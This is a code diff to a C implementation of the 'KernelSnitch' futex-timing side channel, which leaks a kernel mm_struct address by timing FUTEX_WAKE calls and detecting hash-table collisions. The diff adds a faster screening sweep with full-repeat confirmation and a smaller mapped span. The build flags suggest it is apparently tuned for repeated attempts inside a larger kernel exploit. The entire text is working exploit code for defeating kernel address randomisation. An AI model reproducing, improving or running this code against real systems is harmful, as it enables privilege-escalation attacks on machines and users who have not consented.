@@ -16,6 +16,21 @@
 #include <limits.h>
 
 #define FUTEX_SZ (64ULL<<30)
+/*
+ * Screening (cheap sweep measurement + full-repeat confirmation of hits)
+ * is only enabled for controlled-page builds; every other consumer gets
+ * the original engine verbatim.
+ */
+#if defined(CONTROLLED_MM_GROUP_RECLAIM) && CONTROLLED_MM_GROUP_RECLAIM
+#define KS_SCREEN 1
+#else
+#define KS_SCREEN 0
+#endif
+#if KS_SCREEN
+/* Runtime span is sized to what the sweep actually indexes, not the
+ * legacy 64 GiB upper bound - cheaper setup and fork on every attempt. */
+#define FUTEX_SPAN_MIN (256ULL<<20)
+#endif
 #define FUTEX_MMAP_SZ (1ULL<<30)
 #ifndef PAGE_SIZE
 #define PAGE_SIZE 4096
@@ -60,6 +75,13 @@ struct kernelsnitch_shared_state {
     size_t appended_futexes;
     size_t repeat_measurement;
     size_t average;
+#if KS_SCREEN
+    /* Screening pass for sweep candidates; hits are re-confirmed at the
+     * full repeat.  Defaults to repeat_measurement/average. */
+    volatile size_t screen_repeat;
+    volatile size_t screen_average;
+    volatile size_t futex_span;
+#endif
 
     volatile unsigned char *futexes;
     volatile unsigned char inc_futex[KS_PAGE_SIZE];
@@ -216,6 +238,41 @@ static size_t __measure(
     return time;
 }
 
+#if KS_SCREEN
+static size_t __measure_r(
+    struct kernelsnitch_shared_state *ks, size_t futex_addr,
+    size_t repeats, size_t avg_n)
+{
+    size_t t0;
+    size_t t1;
+    size_t time = 0;
+    size_t __times[REPEAT_MEASUREMENT];
+    if (repeats > REPEAT_MEASUREMENT) {
+        repeats = REPEAT_MEASUREMENT;
+    }
+    if (!avg_n || avg_n > repeats) {
+        avg_n = repeats;
+    }
+    for (size_t l = 0; l < repeats; ++l) {
+        sched_yield();
+        t0 = rdtsc_begin();
+        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
+        t1 = rdtsc_end();
+        __times[l] = t1 - t0;
+    }
+    qsort(__times, repeats, sizeof(size_t), __compare);
+    for (size_t l = 0; l < avg_n; ++l)
+        time += __times[l];
+    time /= avg_n;
+    return time;
+}
+
+/* Cheap screen of sweep candidates; misses sit ~10x below threshold so
+ * reduced precision cannot flip the verdict. */
+#define __measure_screen(ks, addr) \
+    __measure_r((ks), (addr), (ks)->screen_repeat, (ks)->screen_average)
+#endif
+
 /**
  * Performs the bruteforce leak in the range [start, end]
  * @arg arg.ks: shared KernelSnitch state
@@ -331,9 +388,21 @@ static inline struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_s
     ks->total_futexes = ks->futex_hash_table_size*ks->collisions*MULITPLE;
     ks->times = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
     ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
+#if KS_SCREEN
+    ks->futex_span =
+        ((size_t)ks->total_futexes * KS_PAGE_SIZE + FUTEX_MMAP_SZ - 1) &
+        ~(FUTEX_MMAP_SZ - 1);
+    if (ks->futex_span < FUTEX_SPAN_MIN) {
+        ks->futex_span = FUTEX_SPAN_MIN;
+    }
+    ks->futexes = SYSCHK(mmap(0, ks->futex_span, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));
+    for (size_t addr = 0; addr < ks->futex_span; addr += FUTEX_MMAP_SZ)
+        SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));
+#else
     ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));
     for (size_t addr = 0; addr < FUTEX_SZ; addr += FUTEX_MMAP_SZ)
         SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));
+#endif
 #if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
     ks->identity_start = IDENTITY_START;
     ks->identity_end = IDENTITY_END;
@@ -376,6 +445,10 @@ static inline void kernelsnitch_set_profile(
     ks->appended_futexes = appended_futexes;
     ks->repeat_measurement = repeat_measurement;
     ks->average = average;
+#if KS_SCREEN
+    ks->screen_repeat = repeat_measurement;
+    ks->screen_average = average;
+#endif
 }
 
 #if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
@@ -430,8 +503,13 @@ static inline void kernelsnitch_find_collisions(struct kernelsnitch_shared_state
     size_t approx_time = (size_t)-1;
     for (int __b = 0; __b < KERNELSNITCH_BASELINE_SAMPLES; ++__b) {
         size_t __s = MIN(
+#if KS_SCREEN
+            __measure_screen(ks, (size_t)&ks->futexes[0]),
+            __measure_screen(ks, (size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+#else
             __measure(ks, (size_t)&ks->futexes[0]),
             __measure(ks, (size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+#endif
         if (__s < approx_time) approx_time = __s;
     }
 
@@ -445,10 +523,18 @@ static inline void kernelsnitch_find_collisions(struct kernelsnitch_shared_state
     if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
     for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
         id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
+#if KS_SCREEN
+        if (id >= ks->futex_span)
+#else
         if (id >= FUTEX_SZ)
+#endif
             break;
         futex_addr = (size_t)&ks->futexes[id];
+#if KS_SCREEN
+        ks->times[i] = __measure_screen(ks, futex_addr);
+#else
         ks->times[i] = __measure(ks, futex_addr);
+#endif
         if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
             int confirmed = 1;
             for (size_t confirmation = 1;
@@ -545,7 +631,11 @@ static inline size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
     ks->tids = 0;
     munmap((void *)ks->futex_addrs, sizeof(size_t)*(ks->collisions + 1));
     ks->futex_addrs = 0;
+#if KS_SCREEN
+    munmap((void *)ks->futexes, ks->futex_span);
+#else
     munmap((void *)ks->futexes, FUTEX_SZ);
+#endif
     ks->futexes = 0;
     size_t ret = ks->mm_struct;
     if (ks->verbose) pr_info("done\n");
